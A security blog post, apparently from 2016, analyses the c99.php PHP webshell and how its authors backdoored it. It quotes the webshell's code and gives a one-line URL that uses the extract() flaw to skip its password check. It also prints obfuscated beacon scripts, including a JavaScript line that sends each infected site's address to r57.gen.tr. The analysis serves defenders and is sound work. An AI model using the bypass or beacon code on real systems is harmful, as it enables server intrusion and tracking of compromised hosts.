@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>c99.php : A backdoor backdoored | RawSec</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="security,backdoor,webshell,php" />
+    
+    <meta name="description" content="C99 is a PHP webshell. Attackers uploads it on web server in order to get informations and above all execute commands with web user privileges (ex: www-data).
+This webshell is protected by a customiza">
+<meta property="og:type" content="article">
+<meta property="og:title" content="c99.php : A backdoor backdoored">
+<meta property="og:url" content="http://rawsec.ml/en/c99-php-backdoor-backdoored/index.html">
+<meta property="og:site_name" content="RawSec">
+<meta property="og:description" content="C99 is a PHP webshell. Attackers uploads it on web server in order to get informations and above all execute commands with web user privileges (ex: www-data).
+This webshell is protected by a customiza">
+<meta property="og:image" content="http://rawsec.ml/images/security-265130_640.jpg">
+<meta property="og:updated_time" content="2016-04-19T20:35:35.480Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="c99.php : A backdoor backdoored">
+<meta name="twitter:description" content="C99 is a PHP webshell. Attackers uploads it on web server in order to get informations and above all execute commands with web user privileges (ex: www-data).
+This webshell is protected by a customiza">
+<meta name="twitter:image" content="http://rawsec.ml/images/security-265130_640.jpg">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="RawSec" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    <link rel="stylesheet" href="/vendor/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/vendor/titillium-web/styles.css">
+    <link rel="stylesheet" href="/vendor/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/vendor/jquery/2.0.3/jquery.min.js"></script>
+    
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38006582-2', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+
+</head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                        <h2 class="subtitle-wrap">
+                            <p class="subtitle">Security is everywhere</p>
+                        </h2>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Home</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/tags/linux/">Linux</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/tags/news/">News</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/tags/security/">Security</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/about/">About</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/security/">security</a>
+    </h1>
+</div>
+                        <div class="main-body-content">
+                            <article id="post-c99-php-backdoor-backdoored" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        c99.php : A backdoor backdoored
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-subtitle">
+                <a href="/en/c99-php-backdoor-backdoored/" class="article-date">
+    <time datetime="2016-04-18T22:00:00.000Z" itemprop="datePublished">Tuesday 19 April 2016 (2016-04-19)</time>
+</a>
+                
+    <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/backdoor/">backdoor</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/security/">security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webshell/">webshell</a></li></ul>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <p>C99 is a PHP webshell. Attackers uploads it on web server in order to get informations and above all execute commands with web user privileges (ex: www-data).</p>
+<p>This webshell is protected by a customizable password, so interface access is limited to people who know the password.</p>
+<p>But the password verification mechanism is vulnerable … in fact the flaw was deliberately inserted into the code to permit the webshell author to bypass it.</p>
+<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line"></div><div class="line"><span class="comment">//Authentication</span></div><div class="line">$login = <span class="string">""</span>; <span class="comment">//login</span></div><div class="line"><span class="comment">//DON'T FORGOT ABOUT PASSWORD!!!</span></div><div class="line">$pass = <span class="string">""</span>; <span class="comment">//password</span></div><div class="line">$md5_pass = <span class="string">""</span>; <span class="comment">//md5-cryped pass. if null, md5($pass)</span></div><div class="line"></div><div class="line">[...]</div><div class="line"></div><div class="line">@$f = $_REQUEST[<span class="string">"f"</span>];</div><div class="line">@extract($_REQUEST[<span class="string">"c999shcook"</span>]);</div><div class="line"></div><div class="line"><span class="comment">//END CONFIGURATION</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// \/Next code isn't for editing\/</span></div><div class="line">@set_time_limit(<span class="number">0</span>);</div><div class="line">$tmp = <span class="keyword">array</span>();</div><div class="line"><span class="keyword">foreach</span>($host_allow <span class="keyword">as</span> $k=&gt;$v) &#123;$tmp[] = str_replace(<span class="string">"\\*"</span>,<span class="string">".*"</span>,preg_quote($v));&#125;</div><div class="line">$s = <span class="string">"!^("</span>.implode(<span class="string">"|"</span>,$tmp).<span class="string">")$!i"</span>;</div><div class="line"><span class="keyword">if</span> (!preg_match($s,getenv(<span class="string">"REMOTE_ADDR"</span>)) <span class="keyword">and</span> !preg_match($s,gethostbyaddr(getenv(<span class="string">"REMOTE_ADDR"</span>)))) &#123;<span class="keyword">exit</span>(<span class="string">"&lt;a href=\"http://ccteam.ru/releases/cc999shell\"&gt;c999shell&lt;/a&gt;: Access Denied - your host ("</span>.getenv(<span class="string">"REMOTE_ADDR"</span>).<span class="string">") not allow"</span>);&#125;</div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($login))</div><div class="line">&#123;</div><div class="line"> <span class="keyword">if</span> (<span class="keyword">empty</span>($md5_pass)) &#123;$md5_pass = md5($pass);&#125;</div><div class="line"> <span class="keyword">if</span> (($_SERVER[<span class="string">"PHP_AUTH_USER"</span>] != $login) <span class="keyword">or</span> (md5($_SERVER[<span class="string">"PHP_AUTH_PW"</span>]) != $md5_pass))</div><div class="line"> &#123;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($login_txt)) &#123;$login_txt = strip_tags(ereg_replace(<span class="string">"&amp;nbsp;|&lt;br&gt;"</span>,<span class="string">" "</span>,$donated_html));&#125;</div><div class="line">  header(<span class="string">"WWW-Authenticate: Basic realm=\"c999shell "</span>.$shver.<span class="string">": "</span>.$login_txt.<span class="string">"\""</span>);</div><div class="line">  header(<span class="string">"HTTP/1.0 401 Unauthorized"</span>);</div><div class="line">  <span class="keyword">exit</span>($accessdeniedmess);</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure>
+<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>Username and password are hardcoded to be easily editable.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Authentication</span></div><div class="line">$login = <span class="string">""</span>; <span class="comment">//login</span></div><div class="line"><span class="comment">//DON'T FORGOT ABOUT PASSWORD!!!</span></div><div class="line">$pass = <span class="string">""</span>; <span class="comment">//password</span></div><div class="line">$md5_pass = <span class="string">""</span>; <span class="comment">//md5-cryped pass. if null, md5($pass)</span></div></pre></td></tr></table></figure></p>
+<p>Next, login and password are checked by the following code:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (($_SERVER[<span class="string">"PHP_AUTH_USER"</span>] != $login) <span class="keyword">or</span> (md5($_SERVER[<span class="string">"PHP_AUTH_PW"</span>]) != $md5_pass))</div></pre></td></tr></table></figure></p>
+<p>If login and password are not correct, an error page indicate that access is forbidden.</p>
+<p>But checking is processed only if login is not empty: <code>if (!empty($login))</code>.</p>
+<p><code>$login</code> is normally initialized staticly at the begining but after that the variable can be modified by <code>extract()</code> function :<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@extract($_REQUEST[<span class="string">"c999shcook"</span>]);</div></pre></td></tr></table></figure></p>
+<h2 id="extract-function"><a href="#extract-function" class="headerlink" title="extract() function"></a>extract() function</h2><p>PHP documentation say :</p>
+<blockquote>
+<p>extract</p>
+<p>(PHP 4, PHP 5, PHP 7)</p>
+<p>extract — Import variables into the current symbol table from an array<br>Description<br>Import variables from an array into the current symbol table.</p>
+<p>Checks each key to see whether it has a valid variable name. It also checks for collisions with existing variables in the symbol table.</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int extract ( <span class="keyword">array</span> &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = <span class="keyword">NULL</span> ]] )</div></pre></td></tr></table></figure>
+<p><code>extract()</code> is mostly used to initialize variables from an array.</p>
+<p>For example:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$var_array = <span class="keyword">array</span>(<span class="string">"color"</span> =&gt; <span class="string">"blue"</span>,</div><div class="line">                   <span class="string">"size"</span>  =&gt; <span class="string">"medium"</span>,</div><div class="line">                   <span class="string">"shape"</span> =&gt; <span class="string">"sphere"</span>);</div><div class="line">extract($var_array);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"$color, $size, $shape\n"</span>;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>will output:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">blue, medium, sphere</div></pre></td></tr></table></figure></p>
+<p>So for each line of the array, the key becomes the variable name and the value is given to the variable.</p>
+<p>This function is dangerous because of it default behaviour : if a key of the extracted array match with an existant variable, the variable value will be replaced by the value of the array given in paramteter to extract().</p>
+<div class="alert alert-info"><i class="fa fa-info"></i>  To develop a secure software, never use extract() with unknown data or user's data (ex: prompt).
+
+There are flags (ex: EXTR_SKIP) to protect already existing variable.</div>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Bypass authentification is very simple : overwrite <code>$login</code> variable.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//url.com/c99.php?c999shcook[login]=0</span></div></pre></td></tr></table></figure></p>
+<p>It’s possible because of:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@extract($_REQUEST[<span class="string">"c999shcook"</span>]);</div></pre></td></tr></table></figure></p>
+<h2 id="Why-a-backdoor"><a href="#Why-a-backdoor" class="headerlink" title="Why a backdoor?"></a>Why a backdoor?</h2><p>Pirates infect websites with webshells, but because this webshell is backdoored other pirates (authors of the webshell) will be able to control the server too.</p>
+<p><code>extract()</code> function and <code>c999shcook</code> array are useless for the webshell but allow to overwrite any variables in the PHP script.</p>
+<h2 id="There-is-another-flaw"><a href="#There-is-another-flaw" class="headerlink" title="There is another flaw"></a>There is another flaw</h2><div class="alert alert-warning"><i class="fa fa-bell"></i>  There is a lot of c99.php variant: c99, c999, c99shell, c99unlimited, ... so some differences may occure.
+
+There is multiple version of each variant and each variant can be declined in multiple forms: php, txt, jpg, ...</div>
+<p>The simplest versions of c99 include a clear script:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://www.r57.gen.tr/yazciz/ciz.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>Others like c99-bd try to poorly obfuscate it:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">&amp;#x68&amp;#fthfthfjgyk&amp;#x2f&amp;#x2f&amp;#x77&amp;#x77&amp;#x77&amp;#x2e&amp;#x70&amp;#x72&amp;#x69&amp;#x76&amp;#x63&amp;#x30&amp;#x64&amp;#x65&amp;#x2e&amp;#x63&amp;#x6f&amp;#x6d&amp;#x2f&amp;#x69&amp;#x6d&amp;#x61&amp;#x67&amp;#x65&amp;#x73&amp;#x2f&amp;#x79&amp;#x61&amp;#x7a&amp;#x2e&amp;#x6a&amp;#x73</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>But a simple HTML decoder will decode <code>http://www.privc0de.com/images/yaz.js</code>.</p>
+<p>Others like c100, r57, c999 or updated c99 version have more sophisticated method like packing the script:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> btoa==<span class="string">"undefined"</span>)btoa=<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;b=(<span class="keyword">typeof</span> b==<span class="string">'undefined'</span>)?<span class="literal">false</span>:b;<span class="keyword">var</span> d,o2,o3,bits,h1,h2,h3,h4,e=[],pad=<span class="string">''</span>,c,plain,coded;<span class="keyword">var</span> f=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span>;plain=b?Utf8.encode(a):a;c=plain.length%<span class="number">3</span>;<span class="keyword">if</span>(c&gt;<span class="number">0</span>)&#123;<span class="keyword">while</span>(c++&lt;3)&#123;pad+='=';plain+='\0'&#125;&#125;for(c=0;c&lt;plain.length;c+=3)&#123;d=plain.charCodeAt(c);o2=plain.charCodeAt(c+1);o3=plain.charCodeAt(c+2);bits=d&lt;&lt;16|o2&lt;&lt;8|o3;h1=bits&gt;&gt;18&amp;0x3f;h2=bits&gt;&gt;12&amp;0x3f;h3=bits&gt;&gt;6&amp;0x3f;h4=bits&amp;0x3f;e[c/3]=f.charAt(h1)+f.charAt(h2)+f.charAt(h3)+f.charAt(h4)&#125;coded=e.join('');coded=coded.slice(0,coded.length-pad.length)+pad;return coded&#125;;if(typeof atob=="undefined")atob=function(a,b)&#123;b=(typeof b=='undefined')?false:b;var e,o2,o3,h1,h2,h3,h4,bits,d=[],plain,coded;var f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";coded=b?Utf8.decode(a):a;for(var c=0;c&lt;coded.length;c+=4)&#123;h1=f.indexOf(coded.charAt(c));h2=f.indexOf(coded.charAt(c+1));h3=f.indexOf(coded.charAt(c+2));h4=f.indexOf(coded.charAt(c+3));bits=h1&lt;&lt;18|h2&lt;&lt;12|h3&lt;&lt;6|h4;e=bits&gt;&gt;&gt;16&amp;0xff;o2=bits&gt;&gt;&gt;8&amp;0xff;o3=bits&amp;0xff;d[c/4]=String.fromCharCode(e,o2,o3);if(h4==0x40)d[c/4]=String.fromCharCode(e,o2);if(h3==0x40)d[c/4]=String.fromCharCode(e)&#125;plain=d.join('');return b?Utf8.decode(plain):plain&#125;;</div><div class="line">setTimeout(function()&#123;new Function(atob(atob(document.getElementById('ghdescon').src.substr(22)).match(/ghdescon(.*?)ghdescon/)[1])).apply(this);kk(1);&#125;, 500);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>and unpack code can be a lot more complex than only base64_decode it or hex_to_ascii it.</p>
+<p>The goal is always the same : each time the page is displayed, the website hosting the webshell will do a request to the malicious address and send the URL where it comes from, permiting to the malicious author to know all the website hosting the backdoored webshell.</p>
+<p>The malicious script from <code>http://www.r57.gen.tr/yazciz/ciz.js</code> looks like this:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=<span class="keyword">new</span><span class="comment">/**/</span>Image();a.src=<span class="string">'http://www.r57.gen.tr/r00t/yaz.php?a='</span>+<span class="built_in">escape</span>(location.href);</div></pre></td></tr></table></figure></p>
+<p>Script kiddies, lamers, and inattentive pirates will use webshells without looking carefully at the code.<br>The combo <em>flaw</em> + <em>inventory of infected website</em> is an easy way, for webshells’ authors, to control a network of server (ex: creating a botnet) by letting to others the system corruption task.</p>
+<p>More sophisticated piracy tools have some vulnerabilities too. Malwares like Smoke Loader (SQL injection), CrimePack (SQL injection) or Zeus (remote access via upload) have been corrupted.</p>
+<h2 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h2><p>When using tools, be carefull, backdoors may be hidden. Pay attention to images, scripts, css, external request, mail functions, encoded code, …</p>
+<p>Source: <em><a href="https://www.lexsi.com/securityhub/c99-php-meme-les-backdoors-backdoorees/" target="_blank" rel="external">C99.php : Quand même les backdoors sont backdoorées</a></em> by <strong>Hugo Ballesteros</strong></p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+
+
+    <a data-url="http://rawsec.ml/en/c99-php-backdoor-backdoored/" data-id="cisq2sx6o005pcb4hyolsp8kd" class="article-share-link"><i class="fa fa-share"></i>Share</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+</article>
+
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>follow:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="flag" href="https://ctftime.org/team/27232" target="_blank">
+                        <i class="icon fa fa-flag"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/noraj1337" target="_blank">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="bitbucket" href="https://bitbucket.org/noraj/" target="_blank">
+                        <i class="icon fa fa-bitbucket"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="gitlab" href="https://gitlab.com/u/noraj" target="_blank">
+                        <i class="icon fa fa-gitlab"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="twitter" href="https://twitter.com/rawsec_cyber" target="_blank">
+                        <i class="icon fa fa-twitter"></i>
+                    </a>
+                </li>
+                
+            
+                
+                <li>
+                    <a class="social-tooltip" title="rss" href="/atom.xml" target="_blank">
+                        <i class="icon fa fa-rss"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/en/find-out-linux-distribution-name-and-version/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">newer</strong>
+        <p class="article-nav-title">
+        
+            How to find out the Linux distribution name and version
+        
+        </p>
+        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+    </a>
+    
+    
+        <a href="/en/tracking-down-tor-users-with-mouse-movements/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">older</strong>
+        <p class="article-nav-title">Tracking down Tor users with mouse movements</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/CTFx-50-crash-forensics/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/security-265130_640.jpg)" alt="CTF(x) - 50 - crash - Forensics" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/CTFx-50-crash-forensics/" class="title">CTF(x) - 50 - crash - Forensics</a></p>
+                            <p class="item-date"><time datetime="2016-08-26T22:00:00.000Z" itemprop="datePublished">Saturday 27 August 2016 (2016-08-27)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/CTFx-50-lambda-cryptography/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/security-265130_640.jpg)" alt="CTF(x) - 50 - λ - Cryptography" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/CTFx-50-lambda-cryptography/" class="title">CTF(x) - 50 - λ - Cryptography</a></p>
+                            <p class="item-date"><time datetime="2016-08-26T22:00:00.000Z" itemprop="datePublished">Saturday 27 August 2016 (2016-08-27)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/IceCTF-45-Toke-Web/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/security-265130_640.jpg)" alt="IceCTF - 45 - Toke - Web" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/IceCTF-45-Toke-Web/" class="title">IceCTF - 45 - Toke - Web</a></p>
+                            <p class="item-date"><time datetime="2016-08-24T22:00:00.000Z" itemprop="datePublished">Thursday 25 August 2016 (2016-08-25)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/IceCTF-15-All-your-Base-are-belong-to-us-Misc/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/security-265130_640.jpg)" alt="IceCTF - 15 - All your Base are belong to us - Misc" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/IceCTF-15-All-your-Base-are-belong-to-us-Misc/" class="title">IceCTF - 15 - All your Base are belong to us - Misc</a></p>
+                            <p class="item-date"><time datetime="2016-08-24T22:00:00.000Z" itemprop="datePublished">Thursday 25 August 2016 (2016-08-25)</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/en/IceCTF-20-Rotated-Cryptograhy/" class="thumbnail">
+    
+    
+        <span style="background-image:url(/images/security-265130_640.jpg)" alt="IceCTF - 20 - Rotated! - Cryptography" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/security/writeups/">writeups</a></p>
+                            <p class="item-title"><a href="/en/IceCTF-20-Rotated-Cryptograhy/" class="title">IceCTF - 20 - Rotated! - Cryptography</a></p>
+                            <p class="item-date"><time datetime="2016-08-24T22:00:00.000Z" itemprop="datePublished">Thursday 25 August 2016 (2016-08-25)</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+            
+                
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">categories</h3>
+        <div class="widget">
